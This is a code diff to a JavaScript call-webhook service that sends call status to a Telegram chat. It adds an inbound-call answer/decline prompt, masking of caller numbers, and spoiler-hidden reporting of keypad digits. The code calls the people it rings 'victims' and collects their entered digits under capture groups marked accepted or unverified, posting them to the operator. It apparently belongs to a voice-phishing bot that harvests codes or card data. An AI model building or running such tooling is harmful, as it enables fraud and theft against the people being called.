@@ -39,6 +39,21 @@ function resolveInboundRouteLabel(toNumber, routes = {}) {
   return route.label || route.name || route.route_label || route.script || null;
 }
 
+function maskPhoneLast4(value) {
+  const digits = normalizePhoneDigits(value);
+  if (!digits) return '••••';
+  if (digits.length <= 4) return `••••${digits}`;
+  return `••••${digits.slice(-4)}`;
+}
+
+function stripStatusEmoji(value) {
+  return String(value || '').replace(/^[^A-Za-z0-9]+/, '').trim();
+}
+
+function escapeMarkdownV2(value) {
+  return String(value || '').replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
+}
+
 class EnhancedWebhookService {
   constructor() {
     this.isRunning = false;
@@ -53,6 +68,10 @@ class EnhancedWebhookService {
     this.statusOrder = ['queued', 'initiated', 'ringing', 'answered', 'in-progress', 'completed', 'voicemail', 'busy', 'no-answer', 'failed', 'canceled'];
     this.liveConsoleByCallSid = new Map();
     this.liveConsoleEditTimers = new Map();
+    this.inboundGate = new Map(); // callSid -> { status, chatId, messageId }
+    this.inboundGateTimers = new Map(); // callSid -> timeout
+    this.inboundPromptTimeoutMs = Number(config.inbound?.promptTimeoutMs) || 30000;
+    this.callTerminator = null;
     const debounce = Number(config.liveConsole?.editDebounceMs);
     this.liveConsoleDebounceMs = Number.isFinite(debounce) && debounce >= 0 ? debounce : 700;
     this.liveConsoleMaxEvents = 4;
@@ -146,6 +165,126 @@ class EnhancedWebhookService {
     return 'the contact';
   }
 
+  getInboundGate(callSid) {
+    if (!callSid) return null;
+    return this.inboundGate.get(callSid) || null;
+  }
+
+  setInboundGate(callSid, status, data = {}) {
+    if (!callSid) return null;
+    const existing = this.inboundGate.get(callSid) || {};
+    const next = {
+      ...existing,
+      status,
+      updatedAt: new Date().toISOString()
+    };
+    if (data.chatId) next.chatId = data.chatId;
+    if (data.messageId) next.messageId = data.messageId;
+    this.inboundGate.set(callSid, next);
+    return next;
+  }
+
+  clearInboundGateTimer(callSid) {
+    const timer = this.inboundGateTimers.get(callSid);
+    if (timer) {
+      clearTimeout(timer);
+      this.inboundGateTimers.delete(callSid);
+    }
+  }
+
+  setCallTerminator(fn) {
+    this.callTerminator = typeof fn === 'function' ? fn : null;
+  }
+
+  async sendInboundPrompt(callSid, chatId, callMeta) {
+    if (!callSid || !chatId) return null;
+    const existing = this.inboundGate.get(callSid);
+    if (existing) return existing;
+    const name = callMeta?.victimName && callMeta.victimName !== 'Unknown' ? callMeta.victimName : null;
+    const fromMasked = maskPhoneLast4(callMeta?.phoneNumber);
+    const routeLabel = callMeta?.routeLabel ? `Route: ${callMeta.routeLabel}` : null;
+    const flag = callMeta?.callerFlag;
+    const flagLine = flag ? `Flag: ${flag}` : null;
+    const riskLine = flag === 'blocked' || flag === 'spam'
+      ? 'Risk: High'
+      : flag === 'allowed'
+        ? 'Risk: Low'
+        : 'Risk: Unknown';
+    const text = [
+      '📞 Incoming call',
+      name ? `From: ${name} • ${fromMasked}` : `From: ${fromMasked}`,
+      routeLabel,
+      flagLine,
+      riskLine,
+      'Tap Answer to open the live console.'
+    ].filter(Boolean).join('\n');
+    const replyMarkup = {
+      inline_keyboard: [[
+        { text: '✅ Answer', callback_data: `inb:answer:${callSid}` },
+        { text: '❌ Decline', callback_data: `inb:decline:${callSid}` }
+      ]]
+    };
+    const response = await this.sendTelegramMessage(chatId, text, false, { replyMarkup });
+    const messageId = response?.result?.message_id || null;
+    const gate = this.setInboundGate(callSid, 'pending', { chatId, messageId });
+    this.clearInboundGateTimer(callSid);
+    if (this.inboundPromptTimeoutMs > 0) {
+      const timer = setTimeout(async () => {
+        const latestGate = this.inboundGate.get(callSid);
+        if (!latestGate || latestGate.status !== 'pending') return;
+        this.setInboundGate(callSid, 'declined', { chatId: latestGate.chatId, messageId: latestGate.messageId });
+        await this.resolveInboundPrompt(callSid, 'timeout');
+        try {
+          await this.db?.updateCallState?.(callSid, 'admin_declined_timeout', {
+            at: new Date().toISOString(),
+            by: latestGate.chatId
+          });
+        } catch (stateError) {
+          console.error('Failed to log auto-decline:', stateError);
+        }
+        if (this.callTerminator) {
+          try {
+            await this.callTerminator(callSid, { reason: 'admin_timeout', chatId: latestGate.chatId });
+          } catch (endError) {
+            console.error('Failed to auto-decline call:', endError);
+          }
+        }
+      }, this.inboundPromptTimeoutMs);
+      this.inboundGateTimers.set(callSid, timer);
+    }
+    return gate;
+  }
+
+  async resolveInboundPrompt(callSid, statusLabel) {
+    const gate = this.inboundGate.get(callSid);
+    if (!gate?.chatId || !gate?.messageId) return;
+    let label = '⚠️ Incoming call update';
+    if (statusLabel === 'answered') {
+      label = '✅ Answered incoming call';
+    } else if (statusLabel === 'declined') {
+      label = '❌ Declined incoming call';
+    } else if (statusLabel === 'timeout') {
+      label = '⌛ No response — call declined';
+    } else if (statusLabel === 'expired') {
+      label = '⏹️ Call ended before response';
+    }
+    try {
+      await this.editTelegramMessage(gate.chatId, gate.messageId, label, false, { inline_keyboard: [] });
+    } catch (error) {
+      console.error('Failed to update inbound prompt:', error?.message || error);
+    }
+  }
+
+  async openInboundConsole(callSid, chatId) {
+    if (!callSid || !chatId) return null;
+    const entry = await this.ensureLiveConsole(callSid, chatId);
+    const statusInfo = this.activeCallStatus.get(callSid);
+    if (statusInfo?.lastStatus) {
+      await this.updateLiveConsoleStatus(callSid, statusInfo.lastStatus, chatId, 'manual');
+    }
+    return entry;
+  }
+
   buildRetryActions(callSid) {
     return {
       inline_keyboard: [
@@ -160,10 +299,26 @@ class EnhancedWebhookService {
     };
   }
 
-  buildDigitSummaryFromEvents(events = []) {
+  buildDigitSummaryFromEvents(events = [], options = {}) {
     if (!Array.isArray(events) || events.length === 0) {
       return '';
     }
+    const useSpoiler = options.spoiler === true;
+    const useEscape = options.escape === true;
+
+    const formatValue = (value) => {
+      const raw = value === undefined || value === null || value === '' ? 'none' : String(value);
+      const escaped = useEscape ? escapeMarkdownV2(raw) : raw;
+      if (useSpoiler && raw !== 'none') {
+        return `||${escaped}||`;
+      }
+      return escaped;
+    };
+
+    const formatLabel = (value) => {
+      const raw = value === undefined || value === null ? '' : String(value);
+      return useEscape ? escapeMarkdownV2(raw) : raw;
+    };
 
     const captureGroups = [
       {
@@ -256,7 +411,7 @@ class EnhancedWebhookService {
       const coveredProfiles = new Set();
 
       for (const group of activeGroups) {
-        lines.push(group.label);
+        lines.push(formatLabel(group.label));
         for (const field of group.fields) {
           const fieldEvents = [];
           field.profiles.forEach((profile) => {
@@ -270,7 +425,7 @@ class EnhancedWebhookService {
           const raw = chosen?.digits ? String(chosen.digits) : '';
           const value = raw || 'none';
           const suffix = chosen?.accepted ? '' : ' (unverified)';
-          lines.push(`${field.label}: ${value}${suffix}`);
+          lines.push(`${formatLabel(field.label)}: ${formatValue(value)}${formatLabel(suffix)}`);
         }
       }
 
@@ -283,7 +438,7 @@ class EnhancedWebhookService {
           const value = raw || 'none';
           const suffix = chosen?.accepted ? '' : ' (unverified)';
           const label = labels[profile] || profile;
-          lines.push(`${label}: ${value}${suffix}`);
+          lines.push(`${formatLabel(label)}: ${formatValue(value)}${formatLabel(suffix)}`);
         }
       }
 
@@ -291,6 +446,8 @@ class EnhancedWebhookService {
     }
 
     const parts = [];
+    const openParen = useEscape ? '\\(' : '(';
+    const closeParen = useEscape ? '\\)' : ')';
     for (const [profile, group] of grouped.entries()) {
       const accepted = group.filter((item) => item.accepted);
       const chosen = accepted.length ? accepted[accepted.length - 1] : group[group.length - 1];
@@ -302,7 +459,7 @@ class EnhancedWebhookService {
       } else if (chosen?.reason) {
         status = 'failed';
       }
-      parts.push(`${label}: ${masked} (${status})`);
+      parts.push(`${formatLabel(label)}: ${formatValue(masked)} ${openParen}${formatLabel(status)}${closeParen}`);
     }
 
     return parts.join('\n');
@@ -353,6 +510,9 @@ class EnhancedWebhookService {
     this.liveConsoleByCallSid.clear();
     this.lastSentimentAt.clear();
     this.mediaSeen.clear();
+    this.inboundGate.clear();
+    this.inboundGateTimers.forEach((timer) => clearTimeout(timer));
+    this.inboundGateTimers.clear();
     console.log('Enhanced webhook service stopped');
   }
 
@@ -536,7 +696,26 @@ class EnhancedWebhookService {
       const voicemailDetected = additionalData.voicemail_detected === true
         || this.isVoicemailAnswer(additionalData.answered_by);
 
-      const consolePromise = this.ensureLiveConsole(call_sid, telegram_chat_id, callMeta);
+      let consolePromise = null;
+      if (callMeta?.inbound) {
+        const gate = this.getInboundGate(call_sid);
+        if (!gate) {
+          await this.sendInboundPrompt(call_sid, telegram_chat_id, callMeta);
+        }
+        const latestGate = this.getInboundGate(call_sid);
+        if (latestGate?.status === 'pending' && this.isTerminalStatus(correctedStatus)) {
+          this.clearInboundGateTimer(call_sid);
+          this.setInboundGate(call_sid, 'expired', { chatId: telegram_chat_id, messageId: latestGate?.messageId });
+          await this.resolveInboundPrompt(call_sid, 'expired');
+        }
+        if (latestGate?.status === 'answered') {
+          consolePromise = this.ensureLiveConsole(call_sid, telegram_chat_id, callMeta);
+        } else {
+          consolePromise = Promise.resolve(null);
+        }
+      } else {
+        consolePromise = this.ensureLiveConsole(call_sid, telegram_chat_id, callMeta);
+      }
 
       if (this.isTerminalStatus(correctedStatus) && !additionalData.deferred && this.shouldDeferTerminalStatus(call_sid)) {
         this.scheduleDeferredTerminalStatus(call_sid, correctedStatus, telegram_chat_id, additionalData);
@@ -552,6 +731,7 @@ class EnhancedWebhookService {
       const victimName = callMeta.victimName || 'the victim';
       let message = '';
       let emoji = '';
+      let parseMode = null;
 
       switch (correctedStatus) {
         case 'queued':
@@ -634,10 +814,13 @@ class EnhancedWebhookService {
             let digitSummary = '';
             if (this.db?.getCallDigits) {
               const events = await this.db.getCallDigits(call_sid).catch(() => []);
-              digitSummary = this.buildDigitSummaryFromEvents(events);
+              digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: true, escape: true });
             }
             if (digitSummary) {
-              message = `${message}\n🔢 Man-detective:\n${digitSummary}`;
+              const header = escapeMarkdownV2(message);
+              const label = escapeMarkdownV2('🔢 Man-detective:');
+              message = `${header}\n${label}\n${digitSummary}`;
+              parseMode = 'MarkdownV2';
             }
           } catch (error) {
             console.error('Failed to append digit summary:', error);
@@ -726,7 +909,7 @@ class EnhancedWebhookService {
 
       if (shouldSendBubble.includes(correctedStatus)) {
         const replyMarkup = shouldOfferRetry ? this.buildRetryActions(call_sid) : null;
-        await this.sendTelegramMessage(telegram_chat_id, fullMessage, false, { replyMarkup });
+        await this.sendTelegramMessage(telegram_chat_id, fullMessage, false, { replyMarkup, parseMode });
         console.log(`✅ Sent enhanced status update: ${correctedStatus} for call ${call_sid}`);
         if (this.isTerminalStatus(correctedStatus)) {
           this.terminalStatusSent.set(call_sid, true);
@@ -1053,7 +1236,9 @@ class EnhancedWebhookService {
       disable_web_page_preview: true
     };
 
-    if (enableMarkdown) {
+    if (options.parseMode) {
+      payload.parse_mode = options.parseMode;
+    } else if (enableMarkdown) {
       payload.parse_mode = 'Markdown';
     }
 
@@ -1090,7 +1275,7 @@ class EnhancedWebhookService {
     return response.data;
   }
 
-  async editTelegramMessage(chatId, messageId, message, enableMarkdown = false, replyMarkup = null) {
+  async editTelegramMessage(chatId, messageId, message, enableMarkdown = false, replyMarkup = null, options = {}) {
     const url = `https://api.telegram.org/bot${this.telegramBotToken}/editMessageText`;
     const payload = {
       chat_id: chatId,
@@ -1099,7 +1284,9 @@ class EnhancedWebhookService {
       disable_web_page_preview: true
     };
 
-    if (enableMarkdown) {
+    if (options.parseMode) {
+      payload.parse_mode = options.parseMode;
+    } else if (enableMarkdown) {
       payload.parse_mode = 'Markdown';
     }
     if (replyMarkup) {
@@ -1311,8 +1498,10 @@ class EnhancedWebhookService {
     const initialStatus = meta.inbound
       ? `📥 Incoming call from ${meta.victimName || 'caller'}…`
       : `📡 Connecting to ${meta.victimName || 'victim'}…`;
+    this.markCallActivity(callSid);
     const entry = {
       chatId,
+      callSid,
       messageId: null,
       createdAt: new Date(),
       lastEditAt: null,
@@ -1341,7 +1530,9 @@ class EnhancedWebhookService {
       latencyMs: null,
       lastWaveformLevel: null,
       sentimentFlag: '',
-      compact: false,
+      compact: meta.inbound === true,
+      actionsExpanded: false,
+      maxEvents: meta.inbound === true ? 3 : null,
       redactPreview: meta.inbound === true
     };
 
@@ -1509,7 +1700,7 @@ class EnhancedWebhookService {
     return `📶 ${this.signalCarrierName} ${bars}  ${this.signalNetworkLabel}`;
   }
 
-  formatEventTimeline(events = []) {
+  formatEventTimeline(events = [], limitOverride = null) {
     const cleaned = events
       .map((event) => String(event || '').trim())
       .filter(Boolean);
@@ -1519,7 +1710,8 @@ class EnhancedWebhookService {
         deduped.push(item);
       }
     }
-    const recent = deduped.slice(-this.liveConsoleMaxEvents);
+    const limit = Number.isFinite(limitOverride) ? limitOverride : this.liveConsoleMaxEvents;
+    const recent = deduped.slice(-limit);
     if (!recent.length) return ['• —'];
     return recent.map((line) => `• ${line}`);
   }
@@ -1654,6 +1846,16 @@ class EnhancedWebhookService {
     const compactLabel = entry?.compact ? '🧭 Full view' : '🧭 Compact view';
     const privacyLabel = entry?.redactPreview ? '🔓 Reveal' : '🔒 Hide';
     if (entry?.inbound) {
+      if (!entry.actionsExpanded) {
+        return {
+          inline_keyboard: [
+            [
+              { text: '⚙️ Actions', callback_data: `lc:actions:${callSid}` },
+              { text: compactLabel, callback_data: `lc:compact:${callSid}` }
+            ]
+          ]
+        };
+      }
       return {
         inline_keyboard: [
           [
@@ -1672,6 +1874,7 @@ class EnhancedWebhookService {
             { text: privacyLabel, callback_data: `lc:privacy:${callSid}` }
           ],
           [
+            { text: '🔽 Hide actions', callback_data: `lc:actions:${callSid}` },
             { text: compactLabel, callback_data: `lc:compact:${callSid}` }
           ]
         ]
@@ -1728,6 +1931,14 @@ class EnhancedWebhookService {
     entry.compact = !entry.compact;
     this.queueLiveConsoleUpdate(callSid, { force: true });
     return entry.compact;
+  }
+
+  toggleConsoleActions(callSid) {
+    const entry = this.liveConsoleByCallSid.get(callSid);
+    if (!entry) return null;
+    entry.actionsExpanded = !entry.actionsExpanded;
+    this.queueLiveConsoleUpdate(callSid, { force: true });
+    return entry.actionsExpanded;
   }
 
   setConsoleCompact(callSid, compact) {
@@ -1818,8 +2029,9 @@ class EnhancedWebhookService {
     const line = String(eventLine || '').trim();
     if (!line) return;
     entry.lastEvents.push(line);
-    if (entry.lastEvents.length > this.liveConsoleMaxEvents) {
-      entry.lastEvents.splice(0, entry.lastEvents.length - this.liveConsoleMaxEvents);
+    const maxEvents = Number.isFinite(entry.maxEvents) ? entry.maxEvents : this.liveConsoleMaxEvents;
+    if (entry.lastEvents.length > maxEvents) {
+      entry.lastEvents.splice(0, entry.lastEvents.length - maxEvents);
     }
     this.queueLiveConsoleUpdate(callSid, { force: !!options.force });
   }
@@ -1925,7 +2137,7 @@ class EnhancedWebhookService {
 
   buildLiveConsoleMessage(entry) {
     const elapsed = this.formatElapsed(entry.createdAt, entry.endedAt);
-    const timeline = this.formatEventTimeline(entry.lastEvents);
+    const timeline = this.formatEventTimeline(entry.lastEvents, entry?.maxEvents);
     const phaseKey = entry.phaseKey || '';
     const frames = this.getWaveformFramesForPhase(phaseKey);
     let phaseLine = entry.phase;
@@ -1940,43 +2152,41 @@ class EnhancedWebhookService {
     const signalLine = this.buildSignalLine(entry);
     const latencyLine = this.formatLatencyLine(entry);
     const healthLine = this.formatHealthLine(entry);
-    const updatedLine = entry.lastEditAt ? `🕒 Updated ${entry.lastEditAt.toLocaleTimeString()}` : null;
-    const headerLine = entry.inbound ? `📥 Incoming Call • ${entry.status}` : `🎧 Live Call • ${entry.status}`;
+    const activityTs = entry.callSid ? this.callActivityAt.get(entry.callSid) : null;
+    const updatedAt = activityTs ? new Date(activityTs) : entry.lastEditAt;
+    const updatedLine = updatedAt ? `🕒 Updated ${updatedAt.toLocaleTimeString()}` : null;
+    const headerLine = entry.inbound
+      ? `${signalLine} | 📥 Incoming • ${stripStatusEmoji(entry.status)}`
+      : `🎧 Live Call • ${entry.status}`;
     const flagLine = entry.inbound ? this.formatCallerFlagLine(entry) : null;
     const previewUser = this.applyPreviewRedaction(entry, entry.previewTurns.user || '—');
     const previewAgent = this.applyPreviewRedaction(entry, entry.previewTurns.agent || '—');
+    const maskedFrom = maskPhoneLast4(entry.phoneNumber);
     const fromLine = entry.inbound
       ? (entry.victimName && entry.victimName !== 'Unknown'
-        ? `📲 From: ${entry.victimName} | 📞 ${entry.phoneNumber}`
-        : `📲 From: ${entry.phoneNumber}`)
+        ? `📲 From: ${entry.victimName} • ${maskedFrom}`
+        : `📲 From: ${maskedFrom}`)
       : `👤 ${entry.victimName} | 📞 ${entry.phoneNumber}`;
 
     if (entry.compact) {
       if (entry.inbound) {
-        const routeLine = entry.routeLabel
-          ? `🧭 Route: ${entry.routeLabel}`
-          : (entry.script && entry.script !== '—' ? `🧩 Script: ${entry.script}` : null);
-        const scriptLine = entry.routeLabel && entry.script && entry.script !== '—' && entry.script !== entry.routeLabel
-          ? `🧩 Script: ${entry.script}`
-          : null;
-        const toLine = entry.toNumber && entry.toNumber !== 'Unknown' ? `📍 To: ${entry.toNumber}` : null;
-        const timingLine = this.formatInboundTimingLine(entry, phaseDisplay);
+        const waitingElapsed = this.formatElapsed(entry.createdAt, entry.pickedUpAt || entry.endedAt);
+        const durationElapsed = entry.pickedUpAt ? this.formatElapsed(entry.pickedUpAt, entry.endedAt) : null;
+        const timingLine = entry.pickedUpAt
+          ? `⏱ Duration ${durationElapsed}`
+          : `⏱ Waiting ${waitingElapsed}`;
+        const recentLines = timeline.length && !(timeline.length === 1 && timeline[0].includes('—'))
+          ? ['Recent', recentBlock]
+          : [];
         return [
-          signalLine,
           headerLine,
           updatedLine,
           fromLine,
-          toLine,
-          routeLine,
-          scriptLine,
+          `📍 Phase: ${phaseDisplay}`,
           timingLine,
-          `${latencyLine} | ${healthLine}`,
+          healthLine,
           flagLine,
-          'Highlights',
-          recentBlock,
-          'Preview',
-          `🧑 ${previewUser}`,
-          `🤖 ${previewAgent}`
+          ...recentLines
         ].filter(Boolean).join('\n');
       }
       return [
@@ -2005,7 +2215,6 @@ class EnhancedWebhookService {
       const toLine = entry.toNumber && entry.toNumber !== 'Unknown' ? `📍 To: ${entry.toNumber}` : null;
       const timingLine = this.formatInboundTimingLine(entry, phaseDisplay);
       return [
-        signalLine,
         headerLine,
         updatedLine,
         fromLine,
@@ -2311,6 +2520,12 @@ class EnhancedWebhookService {
     this.lastSentimentAt.delete(callSid);
     this.mediaSeen.delete(callSid);
     this.callActivityAt.delete(callSid);
+    this.inboundGate.delete(callSid);
+    const gateTimer = this.inboundGateTimers.get(callSid);
+    if (gateTimer) {
+      clearTimeout(gateTimer);
+      this.inboundGateTimers.delete(callSid);
+    }
     this.pendingTerminalStatus.delete(callSid);
     const pendingTimer = this.pendingTerminalTimers.get(callSid);
     if (pendingTimer) {
